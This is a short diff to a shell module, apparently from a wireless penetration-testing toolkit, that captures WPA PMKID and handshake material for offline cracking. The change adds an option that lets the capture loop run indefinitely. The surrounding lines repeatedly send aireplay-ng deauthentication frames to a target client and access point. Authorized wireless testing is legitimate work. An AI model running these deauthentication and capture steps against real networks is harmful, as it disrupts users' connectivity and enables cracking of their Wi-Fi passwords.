@@ -8,6 +8,7 @@
 # DESC="Capture WPA PMKID and 4-way handshakes for offline cracking"
 # REQS="monitor_iface,target_ssid,target_bssid,target_channel"
 # PCAP="yes"
+# TIMED="yes"
 # DECODE="wifi_mgmt"
 
 #===============================================================================
@@ -63,7 +64,7 @@ if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
     HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
     ELAPSED=0
     SUCCESS=0
-    while [[ $ELAPSED -lt $CAPTURE_TIME ]]; do
+    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $CAPTURE_TIME ]]; do
         if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED % 15 == 0 )); then
             aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" || true
         fi
@@ -90,7 +91,7 @@ else
         HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
         ELAPSED=0
         SUCCESS=0
-        while [[ $ELAPSED -lt $CAPTURE_TIME ]]; do
+        while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $CAPTURE_TIME ]]; do
             if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED % 15 == 0 )); then
                 aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 || true
             fi
